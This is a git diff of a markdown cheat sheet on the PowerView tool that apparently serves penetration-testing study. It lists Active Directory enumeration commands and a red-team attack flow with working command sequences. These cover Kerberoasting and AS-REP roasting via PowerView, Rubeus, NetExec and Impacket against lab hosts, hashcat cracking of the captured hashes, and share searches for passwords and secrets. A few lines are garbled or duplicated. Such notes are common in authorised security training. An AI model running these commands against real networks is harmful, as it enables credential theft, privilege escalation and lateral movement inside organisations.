@@ -13,184 +13,392 @@ tags:
 ---
 # Powerview.ps1 
 
-Run from powershell.
+## Setup
 
-Download from PowerSploit Github repo: [https://github.com/ZeroDayLab/PowerSploit](https://github.com/ZeroDayLab/PowerSploit).
-
-```ps
-cd c:\ ; Import-Module .\Powerview.ps1 -Verbose
-```
-
-
-## Enumeration cheat sheet
-
-**Module: ActiveDirectory**
+Download PowerView from the PowerSploit repository:  
+[https://github.com/ZeroDayLab/PowerSploit](https://github.com/ZeroDayLab/PowerSploit)
 
 ```powershell
-########################
-# Domain/LDAP Functions
-########################
-
-# Returns the AD object for the current (or specified) domain
-Get-Domain	
-
-# Return a list of the Domain Controllers for the specified domain
-Get-DomainController	
-
-# Returns all users or specific user objects in AD
-Get-DomainUser	
-# Example: 
-# Get-DomainUser -Identity $username -Domain $domain | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
-
-# Checks for users with the SPN attribute set
-Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
-
-# Returns all computers or specific computer objects in AD
-Get-DomainComputer	
-
-# Returns all groups or specific group objects in AD
-Get-DomainGroup	
-
-# Searches for all or specific OU objects in AD
-Get-DomainOU
-
-# Finds object ACLs in the domain with modification rights set to non-built in objects
-Find-InterestingDomainAcl	
-
-# Returns the members of a specific domain group
-Get-DomainGroupMember	
-# Example: 
-# Get-DomainGroupMember -Identity "Domain Admins" -Recurse
-# Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) 
-
-# Returns a list of servers likely functioning as file servers
-Get-DomainFileServer	
-
-# Returns a list of all distributed file systems for the current (or specified) domain
-Get-DomainDFSShare	
-
-
-########################
-# GPO Functions
-########################
-# Returns all GPOs or specific GPO objects in AD
-Get-DomainGPO	
-
-# Returns the default domain policy or the domain controller policy for the current domain
-Get-DomainPolicy	
-
-
-########################
-# Computer Enumeration Functions
-########################
-# Enumerates local groups on the local or a remote machine
-Get-NetLocalGroup
-
-# Enumerates members of a specific local group
-Get-NetLocalGroupMember	
-
-# Returns open shares on the local (or a remote) machine
-Get-NetShare	
-
-# Returns session information for the local (or a remote) machine
-Get-NetSession	
-
-# Tests if the current user has administrative access to the local (or a remote) machine
-Test-AdminAccess	
-# Example: 
-# Test-AdminAccess -ComputerName ACADEMY-EA-MS01
-
-
-########################
-# Threaded 'Meta'-Functions:
-########################
-# Finds machines where specific users are logged in
-Find-DomainUserLocation	
-
-# Finds reachable shares on domain machines
-Find-DomainShare	
-
-# Searches for files matching specific criteria on readable shares in the domain
-Find-InterestingDomainShareFile	
-
-# Finds machines on the local domain where the current user has local administrator access
-Find-LocalAdminAccess	
-
-
-########################
-# Domain Trust Functions:
-########################
-# Returns domain trusts for the current domain or a specified domain
-Get-DomainTrust	
-
-# Returns all forest trusts for the current forest or a specified forest
-Get-ForestTrust	
-
-# Enumerates users who are in groups outside of the user's domain
-Get-DomainForeignUser	
-
-# Enumerates groups with users outside of the group's domain and returns each foreign member
-Get-DomainForeignGroupMember	
-
-# Enumerates all trusts for the current domain and any others seen.
-Get-DomainTrustMapping	
+cd c:\
+Import-Module .\Powerview.ps1 -Verbose
 ```
 
+Typical Red Team Enumeration Flow:
+
+1. Domain context
+2. Enumerate users
+3. Find privileged users
+4. Identify Kerberoast targets
+5. Enumerate computers
+6. Discover local admin rights
+7. Find active user sessions
+8. Hunt file shares
+9. Discover ACL privilege escalation
+10. Enumerate domain trusts
+
+
+
+---
+
+# Situational Awareness
+
+## Domain Information
 
 ```powershell
-# Gets the ID for the current Domain (useful later for crafting Golden tickets)
+Get-NetDomain
+Get-Domain
 Get-DomainID
-
-# Displays policies for the Domain and accounts, including for instance LockoutBadAccounts
+Get-DomainController
+Get-NetDomainController
 Get-DomainPolicy
 
-# Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
-Get-DomainSPNTicket
+# Current domain SID (for Golden tickets attacks)
+Get-DomainSID
+
+# Current domain name
+Get-Domain | select name
+
+# Policy
+
+
+# Current logged user context
+Get-DomainUser -Identity $env:USERNAME
+
+# Current machine object
+Get-DomainComputer -Identity $env:COMPUTERNAME
+```
+
+---
+
+# User Enumeration
+
+```powershell
+Get-NetUser
+Get-NetUser | select cn
+Get-NetUser | select cn,pwdlastset,lastlogon
+
+Get-NetUser
+Get-NetUser john.doe
+
+# Returns user who are Service Principal
+Get-NetUser -SPN 
+
+Get-DomainUser
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+```
+
+### Privilege Enumeration
+
+```powershell
+Find-LocalAdminAccess
+
+Test-AdminAccess
+
+# Enumerate Domain Admins
+Get-DomainGroupMember -Identity "Domain Admins"
+
+# Enterprise Admins
+Get-DomainGroupMember -Identity "Enterprise Admins"
+
+# Administrators
+Get-DomainGroupMember -Identity "Administrators"
+
+# All privileged users. AdminCount = 1 finds protected accounts
+Get-DomainUser -AdminCount 1
+```
+
+### ACL / Privilege Escalation Discovery 
+
+```
+Find-InterestingDomainAcl
+
+
+# Check ACLs of a specific object
+Get-DomainObjectAcl -Identity "Domain Admins"
+
+# Resolve GUIDs in ACL output
+Get-DomainObjectAcl -ResolveGUIDs
+
+# Find users who can modify groups
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
 ```
 
 
+---
 
-**Module**: `NetShare` (or related networking modules)
+# Group Enumeration
 
 ```powershell
-# Enumerates users
-Get-NetUser
+Get-NetGroup
+Get-NetGroup "Sales Department" | select member
 
-# Enumerates computers in the domain
-Get-NetComputer 
-Get-NetComputer | select name
+Get-DomainGroup
+Get-DomainGroupMember
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+```
+
+---
+
+# Computer Enumeration
+
+```powershell
+Get-NetComputer
+Get-NetComputer | select name,operatingsystemversion
 Get-NetComputer -OperatingSystem "Linux"
 
-# Displays info of current domain. Pay attention to the element forest, to see if there is a bigger structure
-Get-NetDomain
-
-# Gets the ID for the current Domain (useful later for crafting Golden tickets)
-Get-DomainID
-
-# Displays policies for the Domain and accounts, including for instance LockoutBadAccounts
-Get-DomainPolicy
-
-# Displays Domain controller
-Get-NetDomainController
-
-# Lists users in the domain. Useful to search for non expiring passwords, groups belonging, what's their SPN, last time they changed their password... 
-Get Net-User
-Get Net-User john.doe
-
-# Lists users associated to an Service Principal Name (SPN) 
-Get Net-User -SPN
-
-# Lists groups in the domain
-Get-NetGroup
-
-# Lists Group Policy Objects in domain
-Get-NetGPO
-
-# Lists Domain Trusts
-Get-NetDomainTrust
-
-
-# Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
-Get-DomainSPNTicket
+Get-DomainComputer
 ```
 
+Typical enumeration queries:
+
+```powershell
+# Find domain controllers
+Get-DomainComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
+
+# Find SQL servers
+Get-DomainComputer -SPN "MSSQL*"
+
+# Find unconstrained delegation
+Get-DomainComputer -Unconstrained
+
+# Find machines with constrained delegation
+Get-DomainComputer -TrustedToAuth
+```
+
+---
+
+# Lateral movements
+
+```powershell
+# 
+Find-LocalAdminAccess
+
+# Do I have access to
+Test-AdminAccess client74.corp.com
+# Returns boolean
+
+# Find where users are logged in
+Find-DomainUserLocation
+
+# Find sessions on machines. Use verbose in case of empry result to understand what is really happening under the hood
+Get-NetSession -ComputerName files04 -Verbose
+# Example: # Example: G
+
+
+
+# Find logged in users
+Get-NetLoggedon
+
+# Find processes owned by users
+Get-NetProcess
+```
+
+
+## Delegation Attacks 
+
+```
+# Unconstrained delegation
+Get-DomainComputer -Unconstrained
+
+# Constrained delegation
+Get-DomainUser -TrustedToAuth
+
+# Resource-based constrained delegation
+Get-DomainComputer -TrustedToAuth
+```
+
+---
+
+# GPO Enumeration
+
+```powershell
+Get-NetGPO
+Get-DomainGPO
+Get-DomainPolicy
+```
+
+---
+
+# Organizational Units
+
+```powershell
+Get-DomainOU
+```
+
+---
+
+# Trust Enumeration
+
+```powershell
+Get-NetDomainTrust
+
+Get-DomainTrust
+Get-ForestTrust
+Get-DomainTrustMapping
+
+Get-DomainForeignUser
+Get-DomainForeignGroupMember
+```
+
+---
+
+# Kerberos / SPN Enumeration
+
+```powershell
+
+#################
+# Kerberoasting TGS-rep
+################
+
+# 1- Kerberoast targets: List users who are SPNs (Service Principals)
+Get-DomainUser -SPN
+
+# 2- Filter by the serviceprincipalname
+Get-DomainUser -SPN | select serviceprincipalname
+# Example of output: {
+# NOW create a domain ticket, kerberoast it!
+Get-DomainSPNTicket -SPN HTTP/web04.corp.com
+
+# 3. Instead of requesting one SPN manually (#1 and #2 ), run:
+Invoke-Kerberoast -OutputFormat Hashcat
+
+# And to print just the HASH
+(Get-DomainSPNTicket -SPN HTTP/web04.corp.com).Hash
+(Get-DomainSPNTicket -SPN HTTP/web04.corp.com).Hash | Out-File c:\Users\stephanie\Desktop\hash.txt  -Verbose
+(Get-DomainSPNTicket -SPN HTTP/web04.corp.com).Hash > hash.txt
+Get-DomainSPNTicket -SPN HTTP/web04.corp.com | Select -ExpandProperty Hash
+Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt
+
+
+# Retrieve the IP of the machine for loggin purposes
+nslookup web04.corp.com
+```
+
+
+Crack it offline with hashcat module 13100 (Kerberos 5, etype 23,  TGS-rep):
+
+```
+hashcat -m 13100 hash.txt  /usr/share/wordlists/rockyou.txt 
+```
+
+
+```powershell
+
+#################
+# AS-REP roasting 
+################
+
+# AS-REP roasting targets
+Get-DomainUser -PreauthNotRequired
+
+## Option 1, with Powerview
+#  Let's say from previous command we obtain user dave, we can now **AS-REP roast the user `dave`**. Typically we would go with:
+Get-ASREPHash -UserName dave
+
+# Option 2 But the Powerview version may not have those. We may use instead Rubeus:
+.\Rubeus.exe asreproast /user:dave
+
+# Or dump all vulnerable ones
+.\Rubeus.exe asreproast /user:dave
+
+# Option 3: with nxd firt enumerate users
+nxc ldap 192.168.185.70 -u "users.txt" -p '' -k
+# In results it's mention that is vulnerable to asreproast attack, so step 2, attack:
+nxc ldap 192.168.185.70 -u dave -p '' --asreproast output.txt
+
+
+# Option 3: from kali with Impacket
+GetNPUsers.py corp.com/dave -dc-ip 192.168.185.70 -no-pass
+
+# Option 4: from kali with Impacket BUT using a file
+GetNPUsers -dc-ip 192.168.185.70  corp.com/ -usersfile users.txt -format john -outputfile hashes
+```
+
+Crack it offline with hashcat module 18200 (Kerberos 5, etype 23, AS-REP):
+
+```
+hashcat -m 18200 h2.txt  /usr/share/wordlists/rockyou.txt 
+```
+
+
+```powershell
+# Users with passwords not required
+Get-DomainUser -UACFilter PASSWD_NOTREQD
+
+# Users with reversible encryption
+Get-DomainUser -UACFilter ENCRYPTED_TEXT_PASSWORD_ALLOWED
+```
+
+
+
+
+---
+
+# File Server and DFS Enumeration
+
+```powershell
+Get-DomainFileServer
+Get-DomainDFSShare
+```
+
+---
+
+# Share Enumeration
+
+```powershell
+Find-DomainShare -Verbose
+
+# Check accesse to those shares
+Find-DomainShare --CheckShareAccess
+
+Find-InterestingDomainShareFile
+
+Get-NetShare
+
+# Find shares across domain
+Invoke-ShareFinder
+
+# Find sensitive files
+Invoke-FileFinder
+
+# Search for keywords
+Invoke-FileFinder -SearchTerms password,creds,secret
+```
+
+---
+
+---
+
+# Session Enumeration
+
+```powershell
+Get-NetSession
+```
+
+---
+
+# Local Group Enumeration
+
+```powershell
+Get-NetLocalGroup
+Get-NetLocalGroupMember
+```
+
+---
+
+# ACL Enumeration
+
+```powershell
+Find-InterestingDomainAcl
+```
+
+---
+
+# High Value Discovery (Threaded Meta Functions)
+
+```powershell
+Find-DomainUserLocation
+Find-DomainShare
+Find-InterestingDomainShareFile
+Find-LocalAdminAccess
+```
